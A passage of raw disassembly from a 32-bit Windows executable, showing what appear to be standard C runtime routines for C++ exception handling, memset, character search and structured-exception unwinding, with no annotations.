  4048a3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4048a6:	8b 07                	mov    (%edi),%eax
  4048a8:	89 01                	mov    %eax,(%ecx)
  4048aa:	c6 41 04 00          	movb   $0x0,0x4(%ecx)
  4048ae:	5f                   	pop    %edi
  4048af:	5d                   	pop    %ebp
  4048b0:	c3                   	ret
  4048b1:	55                   	push   %ebp
  4048b2:	8b ec                	mov    %esp,%ebp
  4048b4:	56                   	push   %esi
  4048b5:	8b 75 08             	mov    0x8(%ebp),%esi
  4048b8:	80 7e 04 00          	cmpb   $0x0,0x4(%esi)
  4048bc:	74 08                	je     0x4048c6
  4048be:	ff 36                	push   (%esi)
  4048c0:	e8 53 1d 00 00       	call   0x406618
  4048c5:	59                   	pop    %ecx
  4048c6:	83 26 00             	andl   $0x0,(%esi)
  4048c9:	c6 46 04 00          	movb   $0x0,0x4(%esi)
  4048cd:	5e                   	pop    %esi
  4048ce:	5d                   	pop    %ebp
  4048cf:	c3                   	ret
  4048d0:	55                   	push   %ebp
  4048d1:	8b ec                	mov    %esp,%ebp
  4048d3:	83 ec 14             	sub    $0x14,%esp
  4048d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4048d9:	53                   	push   %ebx
  4048da:	57                   	push   %edi
  4048db:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4048de:	bb 20 05 93 19       	mov    $0x19930520,%ebx
  4048e3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4048e6:	85 ff                	test   %edi,%edi
  4048e8:	74 2d                	je     0x404917
  4048ea:	f6 07 10             	testb  $0x10,(%edi)
  4048ed:	74 1e                	je     0x40490d
  4048ef:	8b 08                	mov    (%eax),%ecx
  4048f1:	83 e9 04             	sub    $0x4,%ecx
  4048f4:	56                   	push   %esi
  4048f5:	51                   	push   %ecx
  4048f6:	8b 01                	mov    (%ecx),%eax
  4048f8:	8b 70 20             	mov    0x20(%eax),%esi
  4048fb:	8b ce                	mov    %esi,%ecx
  4048fd:	8b 78 18             	mov    0x18(%eax),%edi
  404900:	ff 15 24 f2 40 00    	call   *0x40f224
  404906:	ff d6                	call   *%esi
  404908:	5e                   	pop    %esi
  404909:	85 ff                	test   %edi,%edi
  40490b:	74 0a                	je     0x404917
  40490d:	f6 07 08             	testb  $0x8,(%edi)
  404910:	74 05                	je     0x404917
  404912:	bb 00 40 99 01       	mov    $0x1994000,%ebx
  404917:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40491a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40491d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404920:	50                   	push   %eax
  404921:	6a 03                	push   $0x3
  404923:	6a 01                	push   $0x1
  404925:	68 63 73 6d e0       	push   $0xe06d7363
  40492a:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40492d:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404930:	ff 15 74 f1 40 00    	call   *0x40f174
  404936:	5f                   	pop    %edi
  404937:	5b                   	pop    %ebx
  404938:	c9                   	leave
  404939:	c2 08 00             	ret    $0x8
  40493c:	e8 80 06 00 00       	call   0x404fc1
  404941:	84 c0                	test   %al,%al
  404943:	75 03                	jne    0x404948
  404945:	32 c0                	xor    %al,%al
  404947:	c3                   	ret
  404948:	e8 26 06 00 00       	call   0x404f73
  40494d:	84 c0                	test   %al,%al
  40494f:	75 07                	jne    0x404958
  404951:	e8 a7 06 00 00       	call   0x404ffd
  404956:	eb ed                	jmp    0x404945
  404958:	b0 01                	mov    $0x1,%al
  40495a:	c3                   	ret
  40495b:	55                   	push   %ebp
  40495c:	8b ec                	mov    %esp,%ebp
  40495e:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  404962:	75 0a                	jne    0x40496e
  404964:	e8 3d 06 00 00       	call   0x404fa6
  404969:	e8 8f 06 00 00       	call   0x404ffd
  40496e:	b0 01                	mov    $0x1,%al
  404970:	5d                   	pop    %ebp
  404971:	c3                   	ret
  404972:	6a 08                	push   $0x8
  404974:	68 98 48 41 00       	push   $0x414898
  404979:	e8 72 f8 ff ff       	call   0x4041f0
  40497e:	8b 45 08             	mov    0x8(%ebp),%eax
  404981:	85 c0                	test   %eax,%eax
  404983:	74 7e                	je     0x404a03
  404985:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  40498b:	75 76                	jne    0x404a03
  40498d:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  404991:	75 70                	jne    0x404a03
  404993:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  40499a:	74 12                	je     0x4049ae
  40499c:	81 78 14 21 05 93 19 	cmpl   $0x19930521,0x14(%eax)
  4049a3:	74 09                	je     0x4049ae
  4049a5:	81 78 14 22 05 93 19 	cmpl   $0x19930522,0x14(%eax)
  4049ac:	75 55                	jne    0x404a03
  4049ae:	8b 48 1c             	mov    0x1c(%eax),%ecx
  4049b1:	85 c9                	test   %ecx,%ecx
  4049b3:	74 4e                	je     0x404a03
  4049b5:	8b 51 04             	mov    0x4(%ecx),%edx
  4049b8:	85 d2                	test   %edx,%edx
  4049ba:	74 29                	je     0x4049e5
  4049bc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4049c0:	52                   	push   %edx
  4049c1:	ff 70 18             	push   0x18(%eax)
  4049c4:	e8 4a 00 00 00       	call   0x404a13
  4049c9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4049d0:	eb 31                	jmp    0x404a03
  4049d2:	ff 75 0c             	push   0xc(%ebp)
  4049d5:	ff 75 ec             	push   -0x14(%ebp)
  4049d8:	e8 43 00 00 00       	call   0x404a20
  4049dd:	59                   	pop    %ecx
  4049de:	59                   	pop    %ecx
  4049df:	c3                   	ret
  4049e0:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4049e3:	eb e4                	jmp    0x4049c9
  4049e5:	f6 01 10             	testb  $0x10,(%ecx)
  4049e8:	74 19                	je     0x404a03
  4049ea:	8b 40 18             	mov    0x18(%eax),%eax
  4049ed:	8b 08                	mov    (%eax),%ecx
  4049ef:	85 c9                	test   %ecx,%ecx
  4049f1:	74 10                	je     0x404a03
  4049f3:	8b 01                	mov    (%ecx),%eax
  4049f5:	51                   	push   %ecx
  4049f6:	8b 70 08             	mov    0x8(%eax),%esi
  4049f9:	8b ce                	mov    %esi,%ecx
  4049fb:	ff 15 24 f2 40 00    	call   *0x40f224
  404a01:	ff d6                	call   *%esi
  404a03:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404a06:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404a0d:	59                   	pop    %ecx
  404a0e:	5f                   	pop    %edi
  404a0f:	5e                   	pop    %esi
  404a10:	5b                   	pop    %ebx
  404a11:	c9                   	leave
  404a12:	c3                   	ret
  404a13:	55                   	push   %ebp
  404a14:	8b ec                	mov    %esp,%ebp
  404a16:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404a19:	ff 55 0c             	call   *0xc(%ebp)
  404a1c:	5d                   	pop    %ebp
  404a1d:	c2 08 00             	ret    $0x8
  404a20:	55                   	push   %ebp
  404a21:	8b ec                	mov    %esp,%ebp
  404a23:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  404a27:	74 32                	je     0x404a5b
  404a29:	56                   	push   %esi
  404a2a:	57                   	push   %edi
  404a2b:	8b 7d 08             	mov    0x8(%ebp),%edi
  404a2e:	8b 37                	mov    (%edi),%esi
  404a30:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  404a36:	75 21                	jne    0x404a59
  404a38:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  404a3c:	75 1b                	jne    0x404a59
  404a3e:	81 7e 14 20 05 93 19 	cmpl   $0x19930520,0x14(%esi)
  404a45:	74 18                	je     0x404a5f
  404a47:	81 7e 14 21 05 93 19 	cmpl   $0x19930521,0x14(%esi)
  404a4e:	74 0f                	je     0x404a5f
  404a50:	81 7e 14 22 05 93 19 	cmpl   $0x19930522,0x14(%esi)
  404a57:	74 06                	je     0x404a5f
  404a59:	5f                   	pop    %edi
  404a5a:	5e                   	pop    %esi
  404a5b:	33 c0                	xor    %eax,%eax
  404a5d:	5d                   	pop    %ebp
  404a5e:	c3                   	ret
  404a5f:	e8 6f 04 00 00       	call   0x404ed3
  404a64:	89 70 10             	mov    %esi,0x10(%eax)
  404a67:	8b 77 04             	mov    0x4(%edi),%esi
  404a6a:	e8 64 04 00 00       	call   0x404ed3
  404a6f:	89 70 14             	mov    %esi,0x14(%eax)
  404a72:	e8 b0 20 00 00       	call   0x406b27
  404a77:	cc                   	int3
  404a78:	e8 56 04 00 00       	call   0x404ed3
  404a7d:	83 c0 10             	add    $0x10,%eax
  404a80:	c3                   	ret
  404a81:	e8 4d 04 00 00       	call   0x404ed3
  404a86:	83 c0 14             	add    $0x14,%eax
  404a89:	c3                   	ret
  404a8a:	cc                   	int3
  404a8b:	cc                   	int3
  404a8c:	cc                   	int3
  404a8d:	cc                   	int3
  404a8e:	cc                   	int3
  404a8f:	cc                   	int3
  404a90:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404a94:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  404a99:	8b d7                	mov    %edi,%edx
  404a9b:	8b 7c 24 04          	mov    0x4(%esp),%edi
  404a9f:	85 c9                	test   %ecx,%ecx
  404aa1:	0f 84 3c 01 00 00    	je     0x404be3
  404aa7:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  404aad:	83 f9 20             	cmp    $0x20,%ecx
  404ab0:	0f 86 df 00 00 00    	jbe    0x404b95
  404ab6:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  404abc:	0f 82 8b 00 00 00    	jb     0x404b4d
  404ac2:	0f ba 25 58 6c 41 00 	btl    $0x1,0x416c58
  404ac9:	01 
  404aca:	73 09                	jae    0x404ad5
  404acc:	f3 aa                	rep stos %al,%es:(%edi)
  404ace:	8b 44 24 04          	mov    0x4(%esp),%eax
  404ad2:	8b fa                	mov    %edx,%edi
  404ad4:	c3                   	ret
  404ad5:	0f ba 25 10 60 41 00 	btl    $0x1,0x416010
  404adc:	01 
  404add:	0f 83 b2 00 00 00    	jae    0x404b95
  404ae3:	66 0f 6e c0          	movd   %eax,%xmm0
  404ae7:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  404aec:	03 cf                	add    %edi,%ecx
  404aee:	0f 11 07             	movups %xmm0,(%edi)
  404af1:	83 c7 10             	add    $0x10,%edi
  404af4:	83 e7 f0             	and    $0xfffffff0,%edi
  404af7:	2b cf                	sub    %edi,%ecx
  404af9:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  404aff:	76 4c                	jbe    0x404b4d
  404b01:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404b08:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404b0f:	90                   	nop
  404b10:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  404b14:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  404b19:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  404b1e:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  404b23:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  404b28:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  404b2d:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  404b32:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  404b37:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  404b3d:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  404b43:	f7 c1 00 ff ff ff    	test   $0xffffff00,%ecx
  404b49:	75 c5                	jne    0x404b10
  404b4b:	eb 13                	jmp    0x404b60
  404b4d:	0f ba 25 10 60 41 00 	btl    $0x1,0x416010
  404b54:	01 
  404b55:	73 3e                	jae    0x404b95
  404b57:	66 0f 6e c0          	movd   %eax,%xmm0
  404b5b:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  404b60:	83 f9 20             	cmp    $0x20,%ecx
  404b63:	72 1c                	jb     0x404b81
  404b65:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  404b69:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  404b6e:	83 c7 20             	add    $0x20,%edi
  404b71:	83 e9 20             	sub    $0x20,%ecx
  404b74:	83 f9 20             	cmp    $0x20,%ecx
  404b77:	73 ec                	jae    0x404b65
  404b79:	f7 c1 1f 00 00 00    	test   $0x1f,%ecx
  404b7f:	74 62                	je     0x404be3
  404b81:	8d 7c 0f e0          	lea    -0x20(%edi,%ecx,1),%edi
  404b85:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  404b89:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  404b8e:	8b 44 24 04          	mov    0x4(%esp),%eax
  404b92:	8b fa                	mov    %edx,%edi
  404b94:	c3                   	ret
  404b95:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404b9b:	74 0e                	je     0x404bab
  404b9d:	88 07                	mov    %al,(%edi)
  404b9f:	47                   	inc    %edi
  404ba0:	83 e9 01             	sub    $0x1,%ecx
  404ba3:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404ba9:	75 f2                	jne    0x404b9d
  404bab:	f7 c1 04 00 00 00    	test   $0x4,%ecx
  404bb1:	74 08                	je     0x404bbb
  404bb3:	89 07                	mov    %eax,(%edi)
  404bb5:	83 c7 04             	add    $0x4,%edi
  404bb8:	83 e9 04             	sub    $0x4,%ecx
  404bbb:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  404bc1:	74 20                	je     0x404be3
  404bc3:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404bca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404bd0:	89 07                	mov    %eax,(%edi)
  404bd2:	89 47 04             	mov    %eax,0x4(%edi)
  404bd5:	83 c7 08             	add    $0x8,%edi
  404bd8:	83 e9 08             	sub    $0x8,%ecx
  404bdb:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  404be1:	75 ed                	jne    0x404bd0
  404be3:	8b 44 24 04          	mov    0x4(%esp),%eax
  404be7:	8b fa                	mov    %edx,%edi
  404be9:	c3                   	ret
  404bea:	cc                   	int3
  404beb:	cc                   	int3
  404bec:	cc                   	int3
  404bed:	cc                   	int3
  404bee:	cc                   	int3
  404bef:	cc                   	int3
  404bf0:	83 3d 54 6c 41 00 01 	cmpl   $0x1,0x416c54
  404bf7:	72 5f                	jb     0x404c58
  404bf9:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  404bfe:	8b d0                	mov    %eax,%edx
  404c00:	c1 e0 08             	shl    $0x8,%eax
  404c03:	0b d0                	or     %eax,%edx
  404c05:	66 0f 6e da          	movd   %edx,%xmm3
  404c09:	f2 0f 70 db 00       	pshuflw $0x0,%xmm3,%xmm3
  404c0e:	0f 16 db             	movlhps %xmm3,%xmm3
  404c11:	8b 54 24 04          	mov    0x4(%esp),%edx
  404c15:	b9 0f 00 00 00       	mov    $0xf,%ecx
  404c1a:	83 c8 ff             	or     $0xffffffff,%eax
  404c1d:	23 ca                	and    %edx,%ecx
  404c1f:	d3 e0                	shl    %cl,%eax
  404c21:	2b d1                	sub    %ecx,%edx
  404c23:	f3 0f 6f 0a          	movdqu (%edx),%xmm1
  404c27:	66 0f ef d2          	pxor   %xmm2,%xmm2
  404c2b:	66 0f 74 d1          	pcmpeqb %xmm1,%xmm2
  404c2f:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
  404c33:	66 0f eb d1          	por    %xmm1,%xmm2
  404c37:	66 0f d7 ca          	pmovmskb %xmm2,%ecx
  404c3b:	23 c8                	and    %eax,%ecx
  404c3d:	75 08                	jne    0x404c47
  404c3f:	83 c8 ff             	or     $0xffffffff,%eax
  404c42:	83 c2 10             	add    $0x10,%edx
  404c45:	eb dc                	jmp    0x404c23
  404c47:	0f bc c1             	bsf    %ecx,%eax
  404c4a:	03 c2                	add    %edx,%eax
  404c4c:	66 0f 7e da          	movd   %xmm3,%edx
  404c50:	33 c9                	xor    %ecx,%ecx
  404c52:	3a 10                	cmp    (%eax),%dl
  404c54:	0f 45 c1             	cmovne %ecx,%eax
  404c57:	c3                   	ret
  404c58:	33 c0                	xor    %eax,%eax
  404c5a:	8a 44 24 08          	mov    0x8(%esp),%al
  404c5e:	53                   	push   %ebx
  404c5f:	8b d8                	mov    %eax,%ebx
  404c61:	c1 e0 08             	shl    $0x8,%eax
  404c64:	8b 54 24 08          	mov    0x8(%esp),%edx
  404c68:	f7 c2 03 00 00 00    	test   $0x3,%edx
  404c6e:	74 15                	je     0x404c85
  404c70:	8a 0a                	mov    (%edx),%cl
  404c72:	83 c2 01             	add    $0x1,%edx
  404c75:	3a cb                	cmp    %bl,%cl
  404c77:	74 59                	je     0x404cd2
  404c79:	84 c9                	test   %cl,%cl
  404c7b:	74 51                	je     0x404cce
  404c7d:	f7 c2 03 00 00 00    	test   $0x3,%edx
  404c83:	75 eb                	jne    0x404c70
  404c85:	0b d8                	or     %eax,%ebx
  404c87:	57                   	push   %edi
  404c88:	8b c3                	mov    %ebx,%eax
  404c8a:	c1 e3 10             	shl    $0x10,%ebx
  404c8d:	56                   	push   %esi
  404c8e:	0b d8                	or     %eax,%ebx
  404c90:	8b 0a                	mov    (%edx),%ecx
  404c92:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  404c97:	8b c1                	mov    %ecx,%eax
  404c99:	8b f7                	mov    %edi,%esi
  404c9b:	33 cb                	xor    %ebx,%ecx
  404c9d:	03 f0                	add    %eax,%esi
  404c9f:	03 f9                	add    %ecx,%edi
  404ca1:	83 f1 ff             	xor    $0xffffffff,%ecx
  404ca4:	83 f0 ff             	xor    $0xffffffff,%eax
  404ca7:	33 cf                	xor    %edi,%ecx
  404ca9:	33 c6                	xor    %esi,%eax
  404cab:	83 c2 04             	add    $0x4,%edx
  404cae:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  404cb4:	75 21                	jne    0x404cd7
  404cb6:	25 00 01 01 81       	and    $0x81010100,%eax
  404cbb:	74 d3                	je     0x404c90
  404cbd:	25 00 01 01 01       	and    $0x1010100,%eax
  404cc2:	75 08                	jne    0x404ccc
  404cc4:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  404cca:	75 c4                	jne    0x404c90
  404ccc:	5e                   	pop    %esi
  404ccd:	5f                   	pop    %edi
  404cce:	5b                   	pop    %ebx
  404ccf:	33 c0                	xor    %eax,%eax
  404cd1:	c3                   	ret
  404cd2:	8d 42 ff             	lea    -0x1(%edx),%eax
  404cd5:	5b                   	pop    %ebx
  404cd6:	c3                   	ret
  404cd7:	8b 42 fc             	mov    -0x4(%edx),%eax
  404cda:	3a c3                	cmp    %bl,%al
  404cdc:	74 36                	je     0x404d14
  404cde:	84 c0                	test   %al,%al
  404ce0:	74 ea                	je     0x404ccc
  404ce2:	3a e3                	cmp    %bl,%ah
  404ce4:	74 27                	je     0x404d0d
  404ce6:	84 e4                	test   %ah,%ah
  404ce8:	74 e2                	je     0x404ccc
  404cea:	c1 e8 10             	shr    $0x10,%eax
  404ced:	3a c3                	cmp    %bl,%al
  404cef:	74 15                	je     0x404d06
  404cf1:	84 c0                	test   %al,%al
  404cf3:	74 d7                	je     0x404ccc
  404cf5:	3a e3                	cmp    %bl,%ah
  404cf7:	74 06                	je     0x404cff
  404cf9:	84 e4                	test   %ah,%ah
  404cfb:	74 cf                	je     0x404ccc
  404cfd:	eb 91                	jmp    0x404c90
  404cff:	5e                   	pop    %esi
  404d00:	5f                   	pop    %edi
  404d01:	8d 42 ff             	lea    -0x1(%edx),%eax
  404d04:	5b                   	pop    %ebx
  404d05:	c3                   	ret
  404d06:	8d 42 fe             	lea    -0x2(%edx),%eax
  404d09:	5e                   	pop    %esi
  404d0a:	5f                   	pop    %edi
  404d0b:	5b                   	pop    %ebx
  404d0c:	c3                   	ret
  404d0d:	8d 42 fd             	lea    -0x3(%edx),%eax
  404d10:	5e                   	pop    %esi
  404d11:	5f                   	pop    %edi
  404d12:	5b                   	pop    %ebx
  404d13:	c3                   	ret
  404d14:	8d 42 fc             	lea    -0x4(%edx),%eax
  404d17:	5e                   	pop    %esi
  404d18:	5f                   	pop    %edi
  404d19:	5b                   	pop    %ebx
  404d1a:	c3                   	ret
  404d1b:	cc                   	int3
  404d1c:	cc                   	int3
  404d1d:	cc                   	int3
  404d1e:	cc                   	int3
  404d1f:	cc                   	int3
  404d20:	53                   	push   %ebx
  404d21:	56                   	push   %esi
  404d22:	57                   	push   %edi
  404d23:	8b 54 24 10          	mov    0x10(%esp),%edx
  404d27:	8b 44 24 14          	mov    0x14(%esp),%eax
  404d2b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404d2f:	55                   	push   %ebp
  404d30:	52                   	push   %edx
  404d31:	50                   	push   %eax
  404d32:	51                   	push   %ecx
  404d33:	51                   	push   %ecx
  404d34:	68 c0 4d 40 00       	push   $0x404dc0
  404d39:	64 ff 35 00 00 00 00 	push   %fs:0x0
  404d40:	a1 04 60 41 00       	mov    0x416004,%eax
  404d45:	33 c4                	xor    %esp,%eax
  404d47:	89 44 24 08          	mov    %eax,0x8(%esp)
  404d4b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404d52:	8b 44 24 30          	mov    0x30(%esp),%eax
  404d56:	8b 58 08             	mov    0x8(%eax),%ebx
  404d59:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404d5d:	33 19                	xor    (%ecx),%ebx
  404d5f:	8b 70 0c             	mov    0xc(%eax),%esi
  404d62:	83 fe fe             	cmp    $0xfffffffe,%esi
  404d65:	0f 84 46 00 00 00    	je     0x404db1
  404d6b:	8b 54 24 34          	mov    0x34(%esp),%edx
  404d6f:	83 fa fe             	cmp    $0xfffffffe,%edx
  404d72:	74 08                	je     0x404d7c
  404d74:	3b f2                	cmp    %edx,%esi
  404d76:	0f 86 35 00 00 00    	jbe    0x404db1
  404d7c:	8d 34 76             	lea    (%esi,%esi,2),%esi
  404d7f:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  404d83:	8b 0b                	mov    (%ebx),%ecx
  404d85:	89 48 0c             	mov    %ecx,0xc(%eax)
  404d88:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  404d8c:	0f 85 c0 ff ff ff    	jne    0x404d52
  404d92:	68 01 01 00 00       	push   $0x101
  404d97:	8b 43 08             	mov    0x8(%ebx),%eax
  404d9a:	e8 91 02 00 00       	call   0x405030
  404d9f:	b9 01 00 00 00       	mov    $0x1,%ecx
  404da4:	8b 43 08             	mov    0x8(%ebx),%eax
  404da7:	e8 a4 02 00 00       	call   0x405050
  404dac:	e9 a1 ff ff ff       	jmp    0x404d52
  404db1:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  404db8:	83 c4 18             	add    $0x18,%esp
  404dbb:	5f                   	pop    %edi
  404dbc:	5e                   	pop    %esi
  404dbd:	5b                   	pop    %ebx
  404dbe:	c3                   	ret
  404dbf:	cc                   	int3
  404dc0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404dc4:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  404dcb:	b8 01 00 00 00       	mov    $0x1,%eax
  404dd0:	74 33                	je     0x404e05
  404dd2:	8b 44 24 08          	mov    0x8(%esp),%eax
  404dd6:	8b 48 08             	mov    0x8(%eax),%ecx
  404dd9:	33 c8                	xor    %eax,%ecx
  404ddb:	e8 65 e9 ff ff       	call   0x403745
  404de0:	55                   	push   %ebp
  404de1:	8b 68 18             	mov    0x18(%eax),%ebp
  404de4:	ff 70 0c             	push   0xc(%eax)
  404de7:	ff 70 10             	push   0x10(%eax)
  404dea:	ff 70 14             	push   0x14(%eax)
  404ded:	e8 2e ff ff ff       	call   0x404d20
  404df2:	83 c4 0c             	add    $0xc,%esp
  404df5:	5d                   	pop    %ebp
  404df6:	8b 44 24 08          	mov    0x8(%esp),%eax
  404dfa:	8b 54 24 10          	mov    0x10(%esp),%edx
  404dfe:	89 02                	mov    %eax,(%edx)
  404e00:	b8 03 00 00 00       	mov    $0x3,%eax
  404e05:	c3                   	ret
  404e06:	cc                   	int3
  404e07:	cc                   	int3
  404e08:	cc                   	int3
  404e09:	cc                   	int3
  404e0a:	cc                   	int3
  404e0b:	cc                   	int3
  404e0c:	cc                   	int3
  404e0d:	cc                   	int3
  404e0e:	cc                   	int3
  404e0f:	cc                   	int3
  404e10:	55                   	push   %ebp
  404e11:	56                   	push   %esi
  404e12:	57                   	push   %edi
  404e13:	53                   	push   %ebx
  404e14:	8b ea                	mov    %edx,%ebp
  404e16:	33 c0                	xor    %eax,%eax
  404e18:	33 db                	xor    %ebx,%ebx
  404e1a:	33 d2                	xor    %edx,%edx
  404e1c:	33 f6                	xor    %esi,%esi
  404e1e:	33 ff                	xor    %edi,%edi
  404e20:	ff d1                	call   *%ecx
  404e22:	5b                   	pop    %ebx
  404e23:	5f                   	pop    %edi
  404e24:	5e                   	pop    %esi
  404e25:	5d                   	pop    %ebp
  404e26:	c3                   	ret
  404e27:	cc                   	int3
  404e28:	cc                   	int3
  404e29:	cc                   	int3
  404e2a:	cc                   	int3
  404e2b:	cc                   	int3
  404e2c:	cc                   	int3
  404e2d:	cc                   	int3
  404e2e:	cc                   	int3
  404e2f:	cc                   	int3
  404e30:	8b ea                	mov    %edx,%ebp
  404e32:	8b f1                	mov    %ecx,%esi
  404e34:	8b c1                	mov    %ecx,%eax
  404e36:	6a 01                	push   $0x1
  404e38:	e8 f3 01 00 00       	call   0x405030
  404e3d:	33 c0                	xor    %eax,%eax
  404e3f:	33 db                	xor    %ebx,%ebx
  404e41:	33 c9                	xor    %ecx,%ecx
  404e43:	33 d2                	xor    %edx,%edx
  404e45:	33 ff                	xor    %edi,%edi
  404e47:	ff e6                	jmp    *%esi
  404e49:	cc                   	int3
  404e4a:	cc                   	int3
  404e4b:	cc                   	int3
  404e4c:	cc                   	int3
  404e4d:	cc                   	int3
  404e4e:	cc                   	int3
  404e4f:	cc                   	int3
  404e50:	55                   	push   %ebp
  404e51:	8b ec                	mov    %esp,%ebp
  404e53:	53                   	push   %ebx
  404e54:	56                   	push   %esi
  404e55:	57                   	push   %edi
  404e56:	6a 00                	push   $0x0
  404e58:	52                   	push   %edx
  404e59:	68 65 4e 40 00       	push   $0x404e65
  404e5e:	51                   	push   %ecx
  404e5f:	ff 15 78 f1 40 00    	call   *0x40f178
  404e65:	5f                   	pop    %edi
  404e66:	5e                   	pop    %esi
  404e67:	5b                   	pop    %ebx
  404e68:	5d                   	pop    %ebp
  404e69:	c3                   	ret
  404e6a:	cc                   	int3
  404e6b:	cc                   	int3
  404e6c:	cc                   	int3
  404e6d:	cc                   	int3
  404e6e:	cc                   	int3
  404e6f:	cc                   	int3
  404e70:	55                   	push   %ebp
  404e71:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  404e75:	52                   	push   %edx
  404e76:	51                   	push   %ecx
  404e77:	ff 74 24 14          	push   0x14(%esp)
  404e7b:	e8 a0 fe ff ff       	call   0x404d20
  404e80:	83 c4 0c             	add    $0xc,%esp
  404e83:	5d                   	pop    %ebp
  404e84:	c2 08 00             	ret    $0x8
  404e87:	55                   	push   %ebp
  404e88:	8b ec                	mov    %esp,%ebp
  404e8a:	a1 24 f2 40 00       	mov    0x40f224,%eax
  404e8f:	3d 4e 3f 40 00       	cmp    $0x403f4e,%eax
  404e94:	74 1f                	je     0x404eb5
  404e96:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
  404e9d:	8b 45 08             	mov    0x8(%ebp),%eax
  404ea0:	8b 80 c4 00 00 00    	mov    0xc4(%eax),%eax
  404ea6:	3b 41 08             	cmp    0x8(%ecx),%eax
  404ea9:	72 05                	jb     0x404eb0
  404eab:	3b 41 04             	cmp    0x4(%ecx),%eax
  404eae:	76 05                	jbe    0x404eb5
  404eb0:	6a 0d                	push   $0xd
  404eb2:	59                   	pop    %ecx
  404eb3:	cd 29                	int    $0x29
  404eb5:	5d                   	pop    %ebp
  404eb6:	c3                   	ret
  404eb7:	55                   	push   %ebp
  404eb8:	8b ec                	mov    %esp,%ebp
  404eba:	8b 45 08             	mov    0x8(%ebp),%eax
  404ebd:	85 c0                	test   %eax,%eax
  404ebf:	74 0e                	je     0x404ecf
  404ec1:	3d 60 6c 41 00       	cmp    $0x416c60,%eax
  404ec6:	74 07                	je     0x404ecf
  404ec8:	50                   	push   %eax
  404ec9:	e8 4a 17 00 00       	call   0x406618
  404ece:	59                   	pop    %ecx
  404ecf:	5d                   	pop    %ebp
  404ed0:	c2 04 00             	ret    $0x4
  404ed3:	e8 09 00 00 00       	call   0x404ee1
  404ed8:	85 c0                	test   %eax,%eax
  404eda:	0f 84 dd 1c 00 00    	je     0x406bbd
  404ee0:	c3                   	ret
  404ee1:	83 3d 20 60 41 00 ff 	cmpl   $0xffffffff,0x416020
  404ee8:	75 03                	jne    0x404eed
  404eea:	33 c0                	xor    %eax,%eax
  404eec:	c3                   	ret
  404eed:	53                   	push   %ebx
  404eee:	57                   	push   %edi
  404eef:	ff 15 70 f0 40 00    	call   *0x40f070
  404ef5:	ff 35 20 60 41 00    	push   0x416020
  404efb:	8b f8                	mov    %eax,%edi
  404efd:	e8 ac 02 00 00       	call   0x4051ae
  404f02:	8b d8                	mov    %eax,%ebx
  404f04:	59                   	pop    %ecx
  404f05:	83 fb ff             	cmp    $0xffffffff,%ebx
  404f08:	74 17                	je     0x404f21
